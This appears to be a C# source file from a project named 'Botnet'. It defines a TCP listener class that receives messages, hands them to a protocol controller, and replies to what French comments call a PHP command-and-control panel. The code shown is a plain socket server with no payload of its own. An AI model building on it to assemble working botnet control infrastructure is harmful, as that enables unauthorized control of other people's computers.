using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Botnet
{
    class ServerConnectors
    {
        public string status;
        public IPAddress iPAddress;
        public int port;

        public ServerConnectors(IPAddress ipadd, int p)
        {
            iPAddress = ipadd;
            port = p;
        }

        public void ListenAndReceiveData() 
        {
            Socket ss = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress ipaddr = iPAddress;
            IPEndPoint ipEnd = new IPEndPoint(ipaddr, port);
            byte[] buff = new byte[1024];
            string data = null;

            try
            {
                ss.Bind(ipEnd);
                ss.Listen(1);

                while (true)
                {
                    status = "Waiting for a connection...";
                    Socket handler = ss.Accept();

                    while (true)
                    {
                        buff = new byte[1024];
                        int bytesRec = handler.Receive(buff);
                        data += Encoding.ASCII.GetString(buff, 0, bytesRec);


                        string response = "";
                        byte[] buffers = new byte[1024];

                        response = new ProtocolController(data).response;
                        
                        //Encodage de la réponse:
                        buffers = UTF8Encoding.UTF8.GetBytes(response);
                        //Envoi de la réponse:
                        handler.Send(buffers);
                        //On ferme le socket, pour que PHP du CNC arrête d'attendre la réponse:
                        handler.Close();
                        //On recommence à écouter:
                        break;
                    }
                    //Contrôle de l'intégrité des données
                    //bool mdr = DataIntegrity(data);
                    Console.WriteLine("Text received : " + data);
                    data = null;
                }
            }

            catch (Exception e)
            {
                status = e.Message;
            }

        }

    }
}
